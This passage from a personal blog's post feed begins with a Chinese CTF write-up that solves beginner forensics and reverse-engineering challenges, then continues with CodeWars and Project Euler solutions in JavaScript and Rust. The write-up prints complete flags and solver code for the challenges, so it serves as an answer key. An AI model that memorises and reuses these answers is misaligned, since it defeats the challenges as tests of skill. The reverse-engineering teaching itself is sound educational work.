DoNothing找程序，可以从启动项/任务管理器里找到一个不一样svchost.exe。 接下来可以通过查看这个程序相关的活动找到输出文件，里面含有flag。 也可以直接查看系统里所有的IO/网络/注册表等的操作情况来查找。这里推荐一下微软的工具箱SysinternalSuite里的procmon。 Memoryflag放在程序的栈上面的，dump下来找一下就行了。 也可以直接在内存里找。 WireFishWireShark抓一下就出来了 这条分割线以下不是我出的，代发一下 Reverseshow me the code我们只看比较关键的给出的代码： 1234567891011for (int i = 1; keystr[i]; i++) &#123; keystr[i] ^= keystr[i-1]; keystr[i] += 2; &#125;...if(!strcmp(keystr,enstr))&#123; ...&#125;else&#123; ...&#125; 用户的输入在经过for循环的操作之后与enstr字符串比对，若相同则提示输入正确，所以我们要做的就是从给出的enstr字符串和for循环里的操作来逆推出正确的输入应该是怎样的。 for循环里从第1位字符开始每个字符异或上一位的字符之后加2，加的逆操作是减，而异或的逆操作则是再次异或相同的数，比如说(a^b)^b = a ，所以我们的逆操作应该是从enstr最后一位字符开始，每一位先减2再异或前一位，循环至第1位，代码如下： 1234567891011## include&lt;stdio.h&gt;int main()&#123; char enstr[]=&#123;0x41,0x04,0x52,0x16,0x6f,0x3a,0x10,0x23,0x42,0x74,0x1b,0x31,0x70,0x49,0x7b,0x26,0x56,0x64,0x3d,0x4c,0x7e,0x0e,0x41,0x27,0x08,0x77&#125;; for(int j=25;j&gt;=1;j--)&#123; enstr[j] -= 2; enstr[j] ^= enstr[j-1]; &#125; printf("%s",enstr); return 0;&#125; 得到flag：ACTF{W41c0m4_70_r4_w0r1d!} 食我ida啦这一题主要是想做一个工具使用的引导，如题所说需要掌握ida的一个最基本的用法，即反编译二进制文件后找到主函数，按下F5查看c代码。 在这一题里做到这一步就能直观地取得flag：ACTF{L15e_1da_d0_rEveR53} （由于出题人图样，flag直接明文存放，可以直接放到二进制编辑器中搜索到flag的大部分。挨打×1） simple packer壳是程序本身为了达成防护或者减小体积的一种手段，根据目的不同分为加密壳和压缩壳。加了壳的程序无法直接进行逆向分析，一般的应对手段是脱壳。 本题采用的壳是upx 2.03，属于压缩壳中比较常见的一种。对于这种壳不需要自己手动脱壳，借助工具(提取码a8rs)可以完成脱壳的工作。本题主要的目的也是让入门的同学们认识到脱壳这一过程，脱完壳后使用ida进行分析可以直接拿到flag： ACTF{L15e_1da_d0_rEveR53} 有关壳的其他相关知识感兴趣的同学可以接下来前往吾爱破解等安全相关论坛学习，里面有丰富的资料。 （由于出题人再次图样，flag又直接明文存放，之前提到的操作可以搜索到完整的flag。绝赞挨打中qwq） simple asm根据给出的c代码我们可以知道这整个程序的流程很简单，要求输入flag后，把输入传入func函数，以func函数的返回值判断用户输入的是否为正确的flag，所以现在要做的就是分析func函数的功能从而解出flag。接下来开始一步步分析给出的func函数的汇编码： 最开始的这一段分析需要掌握栈帧以及函数调用约定的相关知识，这里直接给出分析的结果： 12340x0006fa &lt;+0&gt;: push rbp0x0006fb &lt;+1&gt;: mov rbp,rsp0x0006fe &lt;+4&gt;: mov QWORD PTR [rbp-0x18],rdi0x000702 &lt;+8&gt;: mov DWORD PTR [rbp-0x4],0x0 在simple.c中我们知道有这样一个调用：func(input) ，而上面的汇编代码实现的是将参数input的地址保存到[rbp-0x18]这个地方。之后[rbp-0x4]则作为一个局部变量，为其赋值为0x0。到这里我们可以尝试还原一下c代码： 1234int func(char *input)&#123; int i=0x0; ...&#125; 我们将[rbp-0x4]假设为int型变量i，[rbp-0x18]假设为指向用户输入字符串首地址的指针input，往后看: 12340x000709 &lt;+15&gt;: jmp 0x75d &lt;func+99&gt;...0x00075d &lt;+99&gt;: cmp DWORD PTR [rbp-0x4],0x150x000761 &lt;+103&gt;: jle 0x70b &lt;func+17&gt; 跳转到&lt;func+99&gt;后将[rbp-0x4]中的值（也就是i）与0x15比较，只要不大于0x15就会跳转到&lt;func+17&gt;处。因为i的初值为0x0，所以会实现跳转。 123450x00070b &lt;+17&gt;: mov eax,DWORD PTR [rbp-0x4]0x00070e &lt;+20&gt;: movsxd rdx,eax0x000711 &lt;+23&gt;: mov rax,QWORD PTR [rbp-0x18]0x000715 &lt;+27&gt;: add rax,rdx0x000718 &lt;+30&gt;: movzx edx,BYTE PTR [rax] 根据先前的假设，前四行相当于完成了(input+i),使input指向第i位字符；再看最后的movzx edx,BYTE PTR [rax],这里实现了寻址到(input+i)所表示的地址处并将此地址内存储的值传给edx，写成伪c代码相当于edx = *(input + i) 。 1234560x00071b &lt;+33&gt;: mov eax,DWORD PTR [rbp-0x4]0x00071e &lt;+36&gt;: movsxd rcx,eax0x000721 &lt;+39&gt;: mov rax,QWORD PTR [rbp-0x18]0x000725 &lt;+43&gt;: add rax,rcx0x000728 &lt;+46&gt;: add edx,0x70x00072b &lt;+49&gt;: mov BYTE PTR [rax],dl 这里是比较关键的一个点，前四行进行的是与上一段相同的工作，到了第五行出现了使edx的值加7的操作，而在之前的分析中此时edx中存放的是*(input+i)，最后一行则是将加7之后的结果赋给原(input+i)的地址处。综上，上面的两段汇编实现了: *(input+i) += 7，继续往下看： 1234567890x00072d &lt;+51&gt;: mov eax,DWORD PTR [rbp-0x4]0x000730 &lt;+54&gt;: movsxd rdx,eax0x000733 &lt;+57&gt;: mov rax,QWORD PTR [rbp-0x18]0x000737 &lt;+61&gt;: add rax,rdx0x00073a &lt;+64&gt;: movzx ecx,BYTE PTR [rax]0x00073d &lt;+67&gt;: mov eax,DWORD PTR [rbp-0x4]0x000740 &lt;+70&gt;: movsxd rdx,eax0x000743 &lt;+73&gt;: lea rax,[rip+0x2008f6] ## 0x201040 &lt;enstr&gt;0x00074a &lt;+80&gt;: movzx eax,BYTE PTR [rdx+rax*1] 前5行做的是一样的事，写成伪代码就是 ecx = *(input + i) ; 之后2行则为rdx = i; 最后2行比较关键，lea rax,[rip+0x2008f6]所做的是将simple.c中给出的字符数组enstr的首地址存入rax，而后综合前面的分析可以得出伪代码eax = *(enstr + i)，之后是比较和跳转操作： 123456789100x00074e &lt;+84&gt;: cmp cl,al0x000750 &lt;+86&gt;: je 0x759 &lt;func+95&gt;0x000752 &lt;+88&gt;: mov eax,0x10x000757 &lt;+93&gt;: jmp 0x768 &lt;func+110&gt;0x000759 &lt;+95&gt;: add DWORD PTR [rbp-0x4],0x10x00075d &lt;+99&gt;: cmp DWORD PTR [rbp-0x4],0x150x000761 &lt;+103&gt;: jle 0x70b &lt;func+17&gt;0x000763 &lt;+105&gt;: mov eax,0x00x000768 &lt;+110&gt;: pop rbp0x000769 &lt;+111&gt;: ret 由之前的分析可以很容易看懂这里第一行的cmp操作:*(input + i)与*(enstr + i)比对（此时*(input + i)已经经过了加7的操作），相等则跳转到&lt;func+95&gt;继续执行，i的值加1，又进入&lt;func+99&gt;处的判断（可知这里应该是个while循环），直到i的值大于0x15后，给eax赋0，即此函数的返回值将为0，退回栈帧后返回；不相等则给eax赋1，即此函数的返回值将为1，跳转到&lt;func+110&gt;退回栈帧后返回。综合所有分析，完成c代码的还原: 123456789int func(unsigned char *input)&#123; for(int i=0;i&lt;=21;i++)&#123; input[i]+=7; if(input[i]!=enstr[i])&#123; return 1; &#125; &#125; return 0;&#125; 我们只要将给出的enstr所有值减7，就能拿到flag： ACTF{a5m_15_1mp0r7an7} 关于我F5以后还是搞不懂他在想些什么这档事把文件放入ida分析，进入main 函数以后F5查看c代码。在接收用户输入以后有很长的一段代码： 123456789101112131415161718192021222324252627v3 = malloc(0x82uLL);v14 = v3;v4 = qword_55FA3685F068;*(_QWORD *)v3 = func_s;*((_QWORD *)v3 + 1) = v4;v5 = qword_55FA3685F078;*((_QWORD *)v3 + 2) = qword_55FA3685F070;*((_QWORD *)v3 + 3) = v5;v6 = qword_55FA3685F088;*((_QWORD *)v3 + 4) = qword_55FA3685F080;*((_QWORD *)v3 + 5) = v6;v7 = qword_55FA3685F098;*((_QWORD *)v3 + 6) = qword_55FA3685F090;*((_QWORD *)v3 + 7) = v7;v8 = qword_55FA3685F0A8;*((_QWORD *)v3 + 8) = qword_55FA3685F0A0;*((_QWORD *)v3 + 9) = v8;v9 = qword_55FA3685F0B8;*((_QWORD *)v3 + 10) = qword_55FA3685F0B0;*((_QWORD *)v3 + 11) = v9;v10 = qword_55FA3685F0C8;*((_QWORD *)v3 + 12) = qword_55FA3685F0C0;*((_QWORD *)v3 + 13) = v10;v11 = qword_55FA3685F0D8;*((_QWORD *)v3 + 14) = qword_55FA3685F0D0;*((_QWORD *)v3 + 15) = v11;*((_WORD *)v3 + 64) = word_55FA3685F0E0; 这一段其实耐心看完不难发现，完成的其实只是将以func_s为首地址的之后130个字节的数据拷贝到以v3为首地址的空间里，相当于memcpy((char *)v3,func_s,130);。之后的内容则是将这段数据从v3开始，每个字节都异或0x23: 12345678v17 = v14;v16 = 0;while ( v16 &lt;= 129 )&#123; *v17 ^= 0x23u; ++v16; ++v17;&#125; 完成这一步后出现了一个不太寻常的操作：((void (__fastcall *)(char *, char *))v14)(v13, v13); 将这一段数据当作了函数并且传入参数v13调用了它。最后就到了验证flag的环节。flag当然不会原模原样的放在验证数组里（经过两次挨打的出题人终于不再图样了），所以我们还是要搞清楚这段数据被当作函数调用以后对用户的输入做了什么操作。 问题来了，该怎么分析这段数据呢？一个比较省力的办法是使用ida的动态调试功能（因为是elf文件所以需要在linux的虚拟机里进行远程调试，具体的操作方法搜一蛤就能找到），在调用这段数据时下断点，程序自己运行到断点处时，单步进入，创建函数后再使用F5功能，就能看到这段数据被当作函数时是怎样的代码。经由上述操作，我们进入了获得了这段函数的代码： 12345678__int64 __fastcall sub_56389A4F1830(__int64 a1)&#123; int i; // [rsp+14h] [rbp-4h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) *(_BYTE *)(i + a1) = (*(unsigned __int8 *)(i + a1) &lt;&lt; 32) &amp; ((signed int)*(unsigned __int8 *)(i + a1) &gt;&gt; 32) ^ 0xCC; return 0LL;&#125; a1为用户输入，经历for循环中的移位、和、异或系列操作后返回。之后就是验证环节。运算操作没有很复杂，以下是解密代码： 123456789101112131415161718## include&lt;stdio.h&gt;int main() &#123; char str[]=&#123;0x8d,0x8f,0x98,0x8a,0xb7,0xbf,0xa3,0xa0,0xba,0xa9,0x93,0xbb,0xa5,0xb8,0xa4,0x93,0xa8,0xb5,0xa2, 0xad,0xa1,0xa5,0xaf,0x93,0xa8,0xa9,0xae,0xb9,0xab,0xab,0xa5,0xa2,0xab,0xb1&#125;; for(int i=0;i&lt;=33;i++)&#123; for(char input = 0x20;input&lt;=0x7e;input++)&#123; char input_m; input_m = ((input&lt;&lt;32)&amp;(input&gt;&gt;32)^0xcc); if(input_m == str[i])&#123; printf("%c",input); break; &#125; &#125; &#125; return 0; &#125; 得到flag：ACTF{solve_with_dynamic_debugging}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
        <tag>PWN</tag>
        <tag>Forensics</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-28 Daily Challenge]]></title>
    <url>%2F2019-02-28-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Tribonacci Sequence in JavaScript. CodeWarsProblemTribonacci SequenceWell met with Fibonacci bigger brother, AKA Tribonacci. As the name may already reveal, it works basically like a Fibonacci, but summing the last 3 (instead of 2) numbers of the sequence to generate the next. And, worse part of it, regrettably I won&#39;t get to hear non-native Italian speakers trying to pronounce it :( So, if we are to start our Tribonacci sequence with [1, 1, 1] as a starting input (AKA signature), we have this sequence: 1[1, 1 ,1, 3, 5, 9, 17, 31, ...] But what if we started with [0, 0, 1] as a signature? As starting with [0, 1] instead of [1, 1] basically shifts the common Fibonacci sequence by once place, you may be tempted to think that we would get the same sequence shifted by 2 places, but that is not the case and we would get: 1[0, 0, 1, 1, 2, 4, 7, 13, 24, ...] Well, you may have guessed it by now, but to be clear: you need to create a fibonacci function that given a signature array/list, returns the first n elements - signature included of the so seeded sequence. Signature will always contain 3 numbers; n will always be a non-negative number; if n == 0, then return an empty array and be ready for anything else which is not clearly specified ;) If you enjoyed this kata more advanced and generalized version of it can be found in the Xbonacci kata [Personal thanks to Professor Jim Fowler on Coursera for his awesome classes that I really recommend to any math enthusiast and for showing me this mathematical curiosity too with his usual contagious passion :)]]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-27 Daily Challenge]]></title>
    <url>%2F2019-02-27-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Find The Parity Outlier in JavaScript. CodeWarsProblemFind The Parity OutlierYou are given an array (which will have a length of at least 3, but could be very large) containing integers. The array is either entirely comprised of odd integers or entirely comprised of even integers except for a single integer N. Write a method that takes the array as an argument and returns this &quot;outlier&quot; N. Examples12345[2, 4, 0, 100, 4, 11, 2602, 36]Should return: 11 (the only odd number)[160, 3, 1719, 19, 11, 13, -21]Should return: 160 (the only even number) Solution1234567891011121314function findOutlier(integers)&#123; odd = integers.filter(a =&gt; a&amp;1); even = integers.filter(a =&gt; ~a&amp;1); return odd.length===1?odd[0]:even[0];&#125;function findOutlier(integers)&#123; return integers .slice(0, 3) .filter(a =&gt; a&amp;1) .length&lt;2? integers.find(a =&gt; a&amp;1): integers.find(a =&gt; ~a&amp;1);&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-26 Daily Challenge]]></title>
    <url>%2F2019-02-26-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Vowel Count in JavaScript. CodeWarsProblemVowel CountReturn the number (count) of vowels in the given string. We will consider a, e, i, o, and u as vowels for this Kata. The input string will only consist of lower case letters and/or spaces. Solution1234567function getCount(str) &#123; return (str.match(/[aeiou]/gi)||[]).length;&#125;function getCount(str) &#123; return str.replace(/[^aeiou]/gi, "").length;&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-25 Daily Challenge]]></title>
    <url>%2F2019-02-25-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Find the divisors! in JavaScript. CodeWarsProblemFind the divisors!Create a function named divisors/Divisors that takes an integer n &gt; 1 and returns an array with all of the integer&#39;s divisors(except for 1 and the number itself), from smallest to largest. If the number is prime return the string &#39;(integer) is prime&#39; (null in C#) (use Either String a in Haskell and Result&lt;Vec&lt;u32&gt;, String&gt; in Rust). Example:123divisors(12); // should return [2,3,4,6]divisors(25); // should return [5]divisors(13); // should return "13 is prime" Solution1234function divisors(integer) &#123; s = Array.apply(null, &#123;length: Math.ceil((integer+1)/2)&#125;).map(Number.call, Number).slice(2).filter(x =&gt; integer % x===0); return s.length?s:`$&#123;integer&#125; is prime`;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-24 Daily Challenge]]></title>
    <url>%2F2019-02-24-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Diophantine equation in Rust and Printer Errors in JavaScript. BTW, I found math became more and more difficult, far more than I&#39;ve expected. I decided to learn some practical course before returning to math. So there will be only CodeWars after today~ MathProblemDiophantine equationProblem 66Consider quadratic Diophantine equations of the form: x2 – Dy2 = 1 For example, when D=13, the minimal solution in x is 6492 – 13×1802 = 1. It can be assumed that there are no solutions in positive integers when D is square. By finding minimal solutions in x for D = {2, 3, 5, 6, 7}, we obtain the following: $3^2 – 2×2^2 = 1$$2^2 – 3×1^2 = 1$$9^2 – 5×4^2 = 1$$5^2 – 6×2^2 = 1$$8^2 – 7×3^2 = 1$ Hence, by considering minimal solutions in x for D ≤ 7, the largest x is obtained when D=5. Find the value of D ≤ 1000 in minimal solutions of x for which the largest value of x is obtained. SolutionThanks to How to find a fundamental solution to Pell&#39;s equation? - Mathematics Stack Exchange Pell&#39;s equation - Wikipedia Methods of computing square roots Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758extern crate num_bigint;extern crate num_traits;extern crate num_integer;use num_bigint::BigInt;use num_traits::&#123;Zero, One, FromPrimitive&#125;;use num_integer::Roots;use std::vec::Vec;use std::mem::&#123;replace, swap&#125;;fn main() &#123; let mut ans: BigInt = Zero::zero(); let mut index = 0; for i in 1u64..1001 &#123; let tmp = pell_equation(i); if tmp &gt; ans &#123; replace(&amp;mut ans, tmp); index = i; &#125; &#125; println!("Answer is &#123;&#125;", index);&#125;fn pell_equation(d: u64) -&gt; BigInt &#123; let root = d.sqrt(); if root * root == d &#123; return Zero::zero(); &#125; let dd: BigInt = FromPrimitive::from_u64(d).unwrap(); let mut extra = root; let mut extras: Vec&lt;u64&gt; = vec![]; let mut numerator = 0; let mut denominator = 1; loop &#123; extras.push(extra); numerator = denominator * extra - numerator; if (d - numerator * numerator) % denominator != 0 &amp;&amp; (root + numerator) % denominator != 0 &#123; panic!("???"); &#125; denominator = (d - numerator * numerator) / denominator; extra = (root + numerator) / denominator; let mut denominator: BigInt = Zero::zero(); let mut numerator: BigInt = One::one(); // println!("&#123;:?&#125;", extras); for i in (0..extras.len()).rev() &#123; let mul: BigInt = FromPrimitive::from_u64(extras[i]).unwrap(); denominator = mul * &amp;numerator + &amp;denominator; swap(&amp;mut numerator, &amp;mut denominator); &#125; // println!("&#123;&#125;/&#123;&#125;", numerator.to_str_radix(10), denominator.to_str_radix(10)); let tmp = &amp;numerator * &amp;numerator - &amp;dd * &amp;denominator * &amp;denominator; if tmp == One::one() &#123; println!("&#123;&#125;, &#123;&#125;, &#123;&#125;",d, numerator, denominator); return numerator; &#125; &#125;&#125; CodeWarsProblemPrinter ErrorsIn a factory a printer prints labels for boxes. For one kind of boxes the printer has to use colors which, for the sake of simplicity, are named with letters from a to m. The colors used by the printer are recorded in a control string. For example a &quot;good&quot; control string would be aaabbbbhaijjjm meaning that the printer used three times color a, four times color b, one time color h then one time color a... Sometimes there are problems: lack of colors, technical malfunction and a &quot;bad&quot; control string is produced e.g. aaaxbbbbyyhwawiwjjjwwm with letters not from a to m. You have to write a function printer_error which given a string will output the error rate of the printer as a string representing a rational whose numerator is the number of errors and the denominator the length of the control string. Don&#39;t reduce this fraction to a simpler expression. The string has a length greater or equal to one and contains only letters from ato z. #Examples: 12345s=&quot;aaabbbbhaijjjm&quot;error_printer(s) =&gt; &quot;0/14&quot;s=&quot;aaaxbbbbyyhwawiwjjjwwm&quot;error_printer(s) =&gt; &quot;8/22&quot; Solution1234567891011function printerError(s) &#123; return `$&#123;[...s].map(a=&gt;a.charCodeAt(0)&gt;109).reduce((a, b)=&gt;a+b)&#125;/$&#123;s.length&#125;`;&#125;function printerError(s) &#123; return `$&#123;[...s].filter(a=&gt;a.charCodeAt(0)&gt;109).length&#125;/$&#123;s.length&#125;`;&#125;function printerError(s) &#123; return `$&#123;s.replace(/[a-m]/gi, "").length&#125;/$&#123;s.length&#125;`;&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>ProjectEuler</tag>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-23 Daily Challenge]]></title>
    <url>%2F2019-02-23-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Convergents of e in Rust and Sum of two lowest positive integers in JavaScript. MathProblemConvergents of eProblem 65The square root of 2 can be written as an infinite continued fraction. The infinite continued fraction can be written, √2 = [1;(2)], (2) indicates that 2 repeats ad infinitum. In a similar way, √23 = [4;(1,3,1,8)]. It turns out that the sequence of partial values of continued fractions for square roots provide the best rational approximations. Let us consider the convergents for √2. Hence the sequence of the first ten convergents for √2 are: 1, 3/2, 7/5, 17/12, 41/29, 99/70, 239/169, 577/408, 1393/985, 3363/2378, ... What is most surprising is that the important mathematical constant,e = [2; 1,2,1, 1,4,1, 1,6,1 , ... , 1,2k,1, ...]. The first ten terms in the sequence of convergents for e are: 2, 3, 8/3, 11/4, 19/7, 87/32, 106/39, 193/71, 1264/465, 1457/536, ... The sum of digits in the numerator of the 10th convergent is 1+4+5+7=17. Find the sum of digits in the numerator of the 100th convergent of the continued fraction for e. SolutionThanks to OEIS...... Implementation12345678910111213141516171819202122232425extern crate num_bigint;extern crate num_traits;use num_bigint::BigUint;use num_traits::FromPrimitive;use std::mem::replace;fn main() &#123; let mut a0: BigUint = FromPrimitive::from_u64(1).unwrap(); let mut a1: BigUint = FromPrimitive::from_u64(1).unwrap(); for i in 0..100 &#123; if i % 3 == 0 || i % 3 == 1 &#123; let a2 = a0 + &amp;a1; a0 = replace(&amp;mut a1, a2); &#125; else &#123; let n: BigUint = FromPrimitive::from_u64((i / 3 + 1) * 2).unwrap(); let a2 = n * &amp;a1 + &amp;a0; a0 = replace(&amp;mut a1, a2); &#125; &#125; let ans = a1.to_str_radix(10).chars() .map(|x| x as i32 - '0' as i32) .fold(0, |a, b| a+b); println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblemSum of two lowest positive integersCreate a function that returns the sum of the two lowest positive numbers given an array of minimum 4 integers. No floats or empty arrays will be passed. For example, when an array is passed like [19, 5, 42, 2, 77], the output should be 7. [10, 343445353, 3453445, 3453545353453] should return 3453455. Solution123456789101112131415161718function sumTwoSmallestNumbers(numbers) &#123; numbers.sort((a, b) =&gt; a-b); return numbers[0]+numbers[1];&#125;;const sumTwoSmallestNumbers = (numbers) =&gt; numbers .sort((a, b) =&gt; a-b) .slice(0, 2) .reduce((a, b) =&gt; a+b);const sumTwoSmallestNumbers = (numbers) =&gt; numbers .reduce( (a, b) =&gt; [...a, b].sort((a, b) =&gt; a-b).slice(0, 2), [Number.MAX_SAFE_INTEGER, Number.MAX_SAFE_INTEGER] ) .reduce((a, b) =&gt; a+b);]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>ProjectEuler</tag>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-22 Daily Challenge]]></title>
    <url>%2F2019-02-22-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[I&#39;ve get tired with leetcode, especially meet strange runtime at yesterday. So I jumped into codewors and want to learn some fp and ES6 from Space :D What I&#39;ve done today is Odd period square roots in Rust and Jaden Casing Strings in JavaScript. MathProblemOdd period square rootsProblem 64All square roots are periodic when written as continued fractions and can be written in the form: For example, let us consider √23: If we continue we would get the following expansion: The process can be summarised as follows: It can be seen that the sequence is repeating. For conciseness, we use the notation √23 = [4;(1,3,1,8)], to indicate that the block (1,3,1,8) repeats indefinitely. The first ten continued fraction representations of (irrational) square roots are: √2=[1;(2)], period=1√3=[1;(1,2)], period=2√5=[2;(4)], period=1√6=[2;(2,4)], period=2√7=[2;(1,1,1,4)], period=4√8=[2;(1,4)], period=2√10=[3;(6)], period=1√11=[3;(3,6)], period=2√12= [3;(2,6)], period=2√13=[3;(1,1,1,1,6)], period=5 Exactly four continued fractions, for N ≤ 13, have an odd period. How many continued fractions for N ≤ 10000 have an odd period? SolutionI &quot;borrow&quot; something from wikipedia but don&#39;t get it known... Implementation12345678910111213141516171819202122232425262728fn main() &#123; let mut ans = 0; for i in 1..10001 &#123; ans += get_period(i) &amp; 1; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn get_period(n: i32) -&gt; i32 &#123; let root = (n as f64).sqrt() as i32; if root * root == n &#123; return 0; &#125; let mut extra = root; let mut numerator = 0; let mut denominator = 1; let mut period = 0; while extra != 2 * root &#123; numerator = denominator * extra - numerator; if (n - numerator * numerator) % denominator != 0 &amp;&amp; (root + numerator) % denominator != 0 &#123; panic!("???"); &#125; denominator = (n - numerator * numerator) / denominator; extra = (root + numerator) / denominator; period += 1; &#125; period&#125; CodewarProblemJaden Casing Strings Jaden Smith, the son of Will Smith, is the star of films such as The Karate Kid (2010) and After Earth (2013). Jaden is also known for some of his philosophy that he delivers via Twitter. When writing on Twitter, he is known for almost always capitalizing every word. Your task is to convert strings to how they would be written by Jaden Smith. The strings are actual quotes from Jaden Smith, but they are not capitalized in the same way he originally typed them. Example: 12Not Jaden-Cased: &quot;How can mirrors be real if our eyes aren&apos;t real&quot;Jaden-Cased: &quot;How Can Mirrors Be Real If Our Eyes Aren&apos;t Real&quot; Note that the Java version expects a return value of null for an empty string or null Solution123String.prototype.toJadenCase = function () &#123; return this.split(" ").map(([a, ...i]) =&gt; [a.toUpperCase(), ...i].join("")).join(" ");&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>ProjectEuler</tag>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-21 Daily Challenge]]></title>
    <url>%2F2019-02-21-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Powerful digit counts in Rust and Partition to K Equal Sum Subsets in JavaScript. MathProblemPowerful digit countsProblem 63The 5-digit number, 16807=75, is also a fifth power. Similarly, the 9-digit number, 134217728=89, is a ninth power. How many n-digit positive integers exist which are also an nth power? SolutionKnowledge behind this problem is easy to understand but not easy to illustrate, so check my code~ Implementation1234567891011121314151617fn main() &#123; let mut ans = 0; for i in 1u128..10u128 &#123; let mut stop = false; // Don't stop! let mut exp: u32 = 1; while !stop &#123; let len = i.pow(exp).to_string().len(); if len != exp as usize &#123; stop = true; &#125; else &#123; ans += 1; &#125; exp += 1; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem698. Partition to K Equal Sum SubsetsGiven an array of integers nums and a positive integer k, find whether it&#39;s possible to divide this array into k non-empty subsets whose sums are all equal. Example 1: 123Input: nums = [4, 3, 2, 3, 5, 2, 1], k = 4Output: TrueExplanation: It&apos;s possible to divide it into 4 subsets (5), (1, 4), (2,3), (2,3) with equal sums. Note: 1 &lt;= k &lt;= len(nums) &lt;= 16. 0 &lt; nums[i] &lt; 10000. SolutionJS&#39;s sort is just like shit. Implementation123456789101112131415161718192021222324252627282930/** * @param &#123;number[]&#125; nums * @param &#123;number&#125; k * @return &#123;boolean&#125; */var canPartitionKSubsets = function(nums, k) &#123; let sum = 0; for (let i = 0; i &lt; nums.length; ++i) sum+=nums[i]; let part = sum/k; for (let i = 0; i &lt; nums.length; ++i) if (nums[i] &gt; part) return false; if (sum % k !== 0 || nums.length &lt; k ) return false; let used = Array.from(&#123;length:nums.length&#125;, x=&gt;false); let left = nums.length; return (function dfs(target, start) &#123; if (left === 0) return true; if (target === 0) return dfs(part, 0); for(let i = start; i &lt; nums.length; ++i) &#123; if (!used[i] &amp;&amp; nums[i] &lt;= target) &#123; used[i] = true; left -= 1; if (dfs(target - nums[i], i + 1)) return true; used[i] = false; left += 1; &#125; &#125; return false; &#125;)(part, 0);&#125;;// console.log(canPartitionKSubsets([18,20,39,73,96,99,101,111,114,190,207,295,471,649,700,1037], 4));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-20 Daily Challenge]]></title>
    <url>%2F2019-02-20-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Cubic permutations in Rust and Lemonade Change in JavaScript. MathProblemCubic permutationsProblem 62The cube, 41063625 ($345^3$), can be permuted to produce two other cubes: 56623104 ($384^3$) and 66430125 ($405^3$). In fact, 41063625 is the smallest cube which has exactly three permutations of its digits which are also cube. Find the smallest cube for which exactly five permutations of its digits are cube. SolutionI used a simple function to mapping number to another number to determine if they are of same digits. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051use std::collections::HashMap;fn main() &#123; let mut map: HashMap&lt;u64, usize&gt; = HashMap::new(); let mut first_num: HashMap&lt;u64, u64&gt; = HashMap::new(); let mut found = false; let mut ans = 0; let mut cur = 1; while !found &#123; let cube = cur * cur * cur; let tmp = special_f(cube); let it = map.entry(tmp).or_insert(0); *it += 1; match map.get(&amp;tmp) &#123; Some(n) =&gt; &#123; if *n == 1 &#123; first_num.insert(tmp, cube); &#125; if *n == 5 &#123; found = true; ans = *first_num.get(&amp;tmp).unwrap(); &#125; &#125; None =&gt; (), &#125; cur += 1; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn special_f(mut n: u64) -&gt; u64 &#123; let mut arr: [u64; 10] = [0; 10]; while n &gt; 0 &#123; let tmp = (n % 10) as usize; arr[tmp] += 1; n /= 10; &#125; let mut tmp = 0; for i in 1..10 &#123; while arr[i] &gt; 0 &#123; tmp *= 10; tmp += i; arr[i] -= 1; &#125; &#125; while arr[0] &gt; 0 &#123; tmp *= 10; arr[0] -= 1; &#125; tmp as u64&#125; AlgorithmProblem860. Lemonade ChangeAt a lemonade stand, each lemonade costs $5. Customers are standing in a queue to buy from you, and order one at a time (in the order specified by bills). Each customer will only buy one lemonade and pay with either a $5, $10, or $20 bill. You must provide the correct change to each customer, so that the net transaction is that the customer pays $5. Note that you don&#39;t have any change in hand at first. Return true if and only if you can provide every customer with correct change. Example 1: 1234567Input: [5,5,5,10,20]Output: trueExplanation: From the first 3 customers, we collect three $5 bills in order.From the fourth customer, we collect a $10 bill and give back a $5.From the fifth customer, we give a $10 bill and a $5 bill.Since all customers got correct change, we output true. Example 2: 12Input: [5,5,10]Output: true Example 3: 12Input: [10,10]Output: false Example 4: 1234567Input: 